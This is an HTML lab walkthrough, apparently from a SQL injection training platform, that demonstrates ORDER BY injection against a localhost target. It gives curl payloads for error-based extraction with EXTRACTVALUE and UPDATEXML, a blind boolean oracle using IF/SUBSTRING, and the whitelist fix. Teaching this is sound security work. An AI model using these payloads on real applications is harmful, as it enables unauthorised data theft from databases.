<h4>Step 1: Normal Sorting</h4>
<p>
    Try the sort links to see how sorting works normally.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Sort Behavior</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" --data-urlencode "sort=price"<br>
        <span class="prompt">Query: </span>SELECT id, name, price, category, rating FROM products ORDER BY price<br>
        <span class="prompt">Result: </span>1 | Wireless Mouse | Electronics (lowest price first)<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6 | LED Desk Lamp | ...<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" --data-urlencode "sort=name"<br>
        <span class="prompt">Query: </span>SELECT id, name, price, category, rating FROM products ORDER BY name<br>
        <span class="prompt">Result: </span>5 | Ergonomic Chair | Furniture (alphabetical first)
    </div>
</div>

<h4>Step 2: Confirm Injection with Column Index</h4>
<p>
    ORDER BY accepts both column names and column indices. Use numeric indices to confirm
    that our input is directly interpolated.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Column Index Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" --data-urlencode "sort=1"<br>
        <span class="prompt">Query: </span>... ORDER BY 1<br>
        <span class="prompt">Result: </span>1 | Wireless Mouse | Electronics (sorted by id) -- works!<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" --data-urlencode "sort=999"<br>
        <span class="prompt">Query: </span>... ORDER BY 999<br>
        <span class="prompt">MySQL Error: </span>Unknown column '999' in 'ORDER BY'<br><br>
        <span class="prompt">Analysis: </span>The error confirms our input is directly in the ORDER BY clause.
    </div>
</div>

<h4>Step 3: UNION Does Not Work</h4>
<p>
    The natural instinct might be to try UNION SELECT, but it does not work after ORDER BY.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. UNION Fails</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" --data-urlencode "sort=price UNION SELECT 1,2,3,4,5 -- -"<br>
        <span class="prompt">Query: </span>... ORDER BY price UNION SELECT 1,2,3,4,5 -- -<br>
        <span class="prompt">MySQL Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT 1,2,3,4,5 -- -' at line 1<br><br>
        <span class="prompt">Reason: </span>UNION must come BEFORE ORDER BY in SQL grammar.
    </div>
</div>

<h4>Step 4: Error-Based Extraction in ORDER BY</h4>
<p>
    Use <code>EXTRACTVALUE()</code> inside a subquery expression in the ORDER BY clause.
    This triggers an XPATH error that leaks the target data.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Error-Based Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" \<br>
        &nbsp;&nbsp;--data-urlencode "sort=(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT code FROM promo_codes LIMIT 1))))"<br><br>
        <span class="prompt">Query: </span>SELECT id, name, price, category, rating FROM products ORDER BY (EXTRACTVALUE(1, CONCAT(0x7e, (SELECT code FROM promo_codes LIMIT 1))))<br><br>
        <span class="prompt">MySQL Error: </span>XPATH syntax error: '~FLAG{0rd3r_by_1nj3ct10n}'<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{0rd3r_by_1nj3ct10n}</strong>
    </div>
</div>

<p>
    The XPATH error directly leaks the promo code prefixed with <code>~</code>. This is the
    fastest approach for ORDER BY injection.
</p>

<h4>Step 5: Alternative. Conditional Boolean Oracle</h4>
<p>
    If errors were suppressed, you could use conditional sorting as a boolean oracle to
    extract data character by character.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Conditional Sort Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// If first char = 'F' (TRUE), sort by price:</span><br>
        <span class="prompt">$ </span>curl -s ".../lab15..." --data-urlencode "sort=IF(SUBSTRING((SELECT code FROM promo_codes LIMIT 1),1,1)='F', price, name)"<br>
        <span class="prompt">Result: </span>7 | Noise-Cancel Headset | Audio ... (sorted by <strong>price</strong> -- TRUE!)<br><br>
        <span class="prompt">// If first char = 'X' (FALSE), sort by name:</span><br>
        <span class="prompt">$ </span>curl -s ".../lab15..." --data-urlencode "sort=IF(SUBSTRING((SELECT code FROM promo_codes LIMIT 1),1,1)='X', price, name)"<br>
        <span class="prompt">Result: </span>5 | Ergonomic Chair | Furniture ... (sorted by <strong>name</strong> -- FALSE!)<br><br>
        <span class="prompt">Analysis: </span>By observing which column the results are sorted by, you can determine whether the condition is true or false. Repeat for each character position.
    </div>
</div>

<h4>Step 6: Alternative. UPDATEXML</h4>
<p>
    Another error-based function that works in ORDER BY context.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. UPDATEXML Variant</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab15" \<br>
        &nbsp;&nbsp;--data-urlencode "sort=(UPDATEXML(1, CONCAT(0x7e, (SELECT code FROM promo_codes LIMIT 1)), 1))"<br><br>
        <span class="prompt">MySQL Error: </span>XPATH syntax error: '~FLAG{0rd3r_by_1nj3ct10n}'<br><br>
        <span class="prompt">Note: </span>UPDATEXML works similarly to EXTRACTVALUE for error-based extraction.
    </div>
</div>

<h4>Step 7: Submit the Promo Code</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{0rd3r_by_1nj3ct10n}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> ORDER BY injection is a common but often overlooked vector.
    Because ORDER BY column names cannot be parameterized in many frameworks (they are identifiers,
    not values), developers often concatenate them directly. The fix is to use a <strong>whitelist</strong>
    of allowed column names and reject any input not in the list. Never interpolate user input
    directly into ORDER BY, GROUP BY, or any structural SQL clause.
</div>
